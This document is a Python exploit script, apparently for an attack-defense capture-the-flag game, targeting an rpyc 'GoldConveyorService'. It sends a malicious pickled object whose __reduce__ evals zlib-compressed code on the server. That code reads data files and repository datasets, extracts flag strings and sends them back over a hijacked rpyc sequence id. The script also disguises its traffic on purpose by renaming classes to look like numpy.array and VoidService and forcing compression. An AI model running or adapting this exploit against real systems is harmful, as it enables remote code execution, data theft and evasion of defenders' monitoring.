import sys
import zlib
from typing import cast

import rpyc

from conveyor import GoldConveyorService

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} [TASK_IP] [account IDs...]", file=sys.stderr)
    exit(-1)

TASK_IP = sys.argv[1]
ACCOUNT_IDS = sys.argv[2:]


class Exploit:
    def __init__(self, code: str):
        transformed = zlib.compress(code.encode()).hex()
        # or __import__('numpy').array([[1]]) needed to avoid raising error,
        # this way the traffic is way less suspicious.
        # [[1]] here and later during fit_ridge is needed to avoid ridge fit error.
        self.code = f"exec(__import__('zlib').decompress(bytes.fromhex('{transformed}'))) or __import__('numpy').array([[1]])"

    def _rpyc_getattr(self, name):
        if name == "__array__":
            return self.__array__
        raise AttributeError()

    def __array__(self):
        pass

    def __reduce__(self):
        return (__import__("builtins").eval, (self.code,))


# Obfuscate exploit class name in traffic
Exploit.__module__ = "numpy"
Exploit.__name__ = "array"

# Always compress data to obfuscate payload in traffic
rpyc.Channel.COMPRESSION_THRESHOLD = 0  # type: ignore

payload = """
import inspect
import re
import os

stack = inspect.stack()
handle_call_stack = next(filter(lambda s: s.function == '_handle_call', stack))
conn = handle_call_stack.frame.f_locals['self']
send = lambda conn, s: conn._send(2, 1337, conn._box(__import__('zlib').compress(s.encode())))

flagre = re.compile(b'[A-Z0-9]{31}=')
for filename in os.listdir('/conveyor/data'):
    with open('/conveyor/data/'+filename, 'rb') as f:
        data = f.read()
    for flag in flagre.findall(data):
        send(conn, 'file flag ' + flag.decode())

for account in conn.root.data:
    datasets = conn._local_root.repository.list_datasets(account)
    for dataset in datasets:
        send(conn, 'redis flag ' + dataset.name + ' ' + dataset.description)
"""


# Override _seq_request_callback in rpyc.Connection to always handle the special seq id 1337,
# which will be used for all data exfiltration
def _seq_request_callback(self, msg, seq, is_exc, obj):
    if seq == 1337:
        print(f"Exfiltrated data: {zlib.decompress(obj).decode()}")
        return

    _callback = self._request_callbacks.pop(seq, None)
    if _callback is not None:
        _callback(is_exc, obj)
    elif self._config["logger"] is not None:
        debug_msg = "Recieved {} seq {} and a related request callback did not exist"
        self._config["logger"].debug(debug_msg.format(msg, seq))


rpyc.Connection._seq_request_callback = _seq_request_callback


# Service for sending data to the payload (i.e. user IDs for requesting data from redis).
# Called VoidService to resemble the default rpyc VoidService.
class VoidService(rpyc.Service):
    def __init__(self, data):
        self.data = data

    def _rpyc_getattr(self, name):
        if name == "data":
            return self.data
        raise AttributeError()


VoidService.__module__ = rpyc.VoidService.__module__
VoidService.__name__ = rpyc.VoidService.__name__

# Establish simple connection, but allows pickle.dumps on the client
conn: rpyc.Connection = rpyc.connect(
    host=TASK_IP, port=12378, config=dict(allow_pickle=True), service=VoidService(ACCOUNT_IDS)  # type: ignore
)
service: GoldConveyorService = cast(GoldConveyorService, conn.root)

# Trigger exploit
service.model_conveyor.fit_ridge(cast(list, Exploit(payload)), [[1]])
